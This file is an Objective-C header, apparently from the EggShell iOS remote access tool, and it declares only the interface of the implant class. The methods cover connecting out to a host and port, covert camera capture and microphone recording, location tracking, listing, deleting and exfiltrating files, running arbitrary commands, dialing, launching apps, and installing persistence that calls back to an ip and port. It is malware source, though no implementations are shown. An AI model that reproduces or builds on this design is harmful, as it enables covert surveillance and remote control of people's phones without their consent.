//
//espl.h
#include <arpa/inet.h>
#import <AppSupport/CPDistributedMessagingCenter.h>
#import <AVFoundation/AVFoundation.h>
#import <AudioToolbox/AudioToolbox.h>
#import <CoreLocation/CoreLocation.h>
#import <CoreFoundation/CFUserNotification.h>
#import "FBEncryptorAES.h"
#import <MediaPlayer/MediaPlayer.h>
#include "NSData+AESCrypt.h"
#include "SpringBoardServices/SpringBoardServices.h"
#import <UIKit/UIKit.h>

@interface espl:NSObject <AVAudioRecorderDelegate>
@property (nonatomic,strong) AVCaptureSession *session;
@property (readwrite, retain) AVCaptureStillImageOutput *stillImageOutput;
@property (nonatomic,retain) AVAudioRecorder *recorder;
@property (retain) NSFileManager *fileManager;
@property (retain) UIDevice *thisUIDevice;
@property (retain) NSString *skey;
@property (retain) NSString *terminator;
@property (retain) CPDistributedMessagingCenter *messagingCenter;
@property (nonatomic,retain) NSTimer *timer;
//socks
extern int sockfd;
-(int)connect:(NSString*)host
             :(long)port;
-(void)sendData:(NSData *)data;
-(void)sendString:(NSString *)string;

//convenience
-(NSString *)forgetFirst:(NSArray *)args;
-(void)blank;

//camera
-(void)camera:(BOOL)isfront;
-(AVCaptureDevice *)frontFacingCameraIfAvailable;
-(AVCaptureDevice *)backFacingCameraIfAvailable;
-(void)setupCaptureSession:(BOOL)isfront;
-(void)captureWithBlock:(void(^)(NSData* imageData))block;

//mic
-(void)mic:(NSArray *)args;
//file management
-(void)directoryList:(NSArray *)args;
-(void)rmFile:(NSArray *)args;
-(void)changeWD:(NSArray *)args;
-(void)sendEncryptedFile:(NSData *)fileData;
-(void)download:(NSArray *)args;
-(void)encryptFile:(NSArray *)args;
-(void)decryptFile:(NSArray *)args;

//misc
extern int SBSLaunchApplicationWithIdentifier(CFStringRef identifier, Boolean suspended);
extern CFStringRef SBSApplicationLaunchingErrorString(int error);
-(void)locate;
-(void)exec:(NSString *)command;
-(void)vibrate;
-(void)say:(NSString *)string;
-(void)displayalert:(const char *)title :(const char *)message;
-(void)alert:(NSArray *)cmdarray;
-(void)getPid;
-(void)openURL:(NSArray *)args;
-(void)dial:(NSArray *)args;
-(void)setVolume:(NSArray *)args;
-(void)getVolume;
-(void)isplaying;
-(void)listapps;
-(NSString *)battery;
-(void)sysinfo;
-(void)launchApp:(NSArray *)args;
-(void)persistence:(NSString *)ip :(int)port;
-(void)rmpersistence;

//eggshell pro
-(void)upload:(NSString *)uploadpath;
-(void)mcSendNoReply:(NSString *)command;
-(void)mcSendYesReply:(NSString *)command;
-(void)locationService:(NSArray *)args;

@end

//
